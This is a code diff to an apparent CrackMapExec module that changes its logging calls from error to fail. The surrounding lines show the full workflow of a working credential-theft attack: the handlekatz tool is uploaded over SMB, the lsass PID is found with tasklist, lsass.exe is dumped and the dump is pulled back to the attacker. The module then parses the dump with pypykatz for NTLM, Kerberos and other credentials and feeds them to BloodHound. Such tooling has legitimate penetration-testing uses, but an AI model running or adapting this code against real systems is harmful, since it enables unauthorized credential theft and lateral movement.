@@ -60,7 +60,7 @@ class CMEModule:
                 connection.conn.putFile(self.share, self.tmp_share + self.handlekatz, handlekatz.read)
                 context.log.success('Created file {} on the \\\\{}{}'.format(self.handlekatz, self.share, self.tmp_share))
             except Exception as e:
-              context.log.error('Error writing file to share {}: {}'.format(share, e))
+              context.log.fail('Error writing file to share {}: {}'.format(share, e))
     
         # get pid lsass
         command = 'tasklist /v /fo csv | findstr /i "lsass"'
@@ -76,7 +76,7 @@ class CMEModule:
             context.log.success('Process lsass.exe was successfully dumped')
             dump = True
         else:
-            context.log.error('Process lsass.exe error un dump, try with verbose')
+            context.log.fail('Process lsass.exe error un dump, try with verbose')
         
         if dump:
             regex = r"([A-Za-z0-9-]*\.log)"
@@ -95,19 +95,19 @@ class CMEModule:
                     connection.conn.getFile(self.share, self.tmp_share + machine_name, dump_file.write)
                     context.log.success('Dumpfile of lsass.exe was transferred to {}'.format(self.dir_result + machine_name))
                 except Exception as e:
-                    context.log.error('Error while get file: {}'.format(e))
+                    context.log.fail('Error while get file: {}'.format(e))
 
             try:
                 connection.conn.deleteFile(self.share, self.tmp_share + self.handlekatz)
                 context.log.success('Deleted handlekatz file on the {} share'.format(self.share))
             except Exception as e:
-                context.log.error('Error deleting handlekatz file on share {}: {}'.format(self.share, e))
+                context.log.fail('Error deleting handlekatz file on share {}: {}'.format(self.share, e))
             
             try:
                 connection.conn.deleteFile(self.share, self.tmp_share + machine_name)
                 context.log.success('Deleted lsass.dmp file on the {} share'.format(self.share))
             except Exception as e:
-                context.log.error('Error deleting lsass.dmp file on share {}: {}'.format(self.share, e))
+                context.log.fail('Error deleting lsass.dmp file on share {}: {}'.format(self.share, e))
 
             h_in = open(self.dir_result + machine_name, "rb")
             h_out = open(self.dir_result + machine_name + ".decode", "wb")
@@ -132,7 +132,7 @@ class CMEModule:
                         pypy_parse = pypykatz.parse_minidump_external(dump)
                     except Exception as e:
                         pypy_parse = None
-                        context.log.error(f'Error parsing minidump: {e}')
+                        context.log.fail(f'Error parsing minidump: {e}')
 
                     ssps = ['msv_creds', 'wdigest_creds', 'ssp_creds', 'livessp_creds', 'kerberos_creds', 'credman_creds',
                             'tspkg_creds']
@@ -154,4 +154,4 @@ class CMEModule:
                     if len(credz_bh) > 0:
                         add_user_bh(credz_bh, None, context.log, connection.config)
                 except Exception as e:
-                    context.log.error('Error opening dump file', str(e))
+                    context.log.fail('Error opening dump file', str(e))
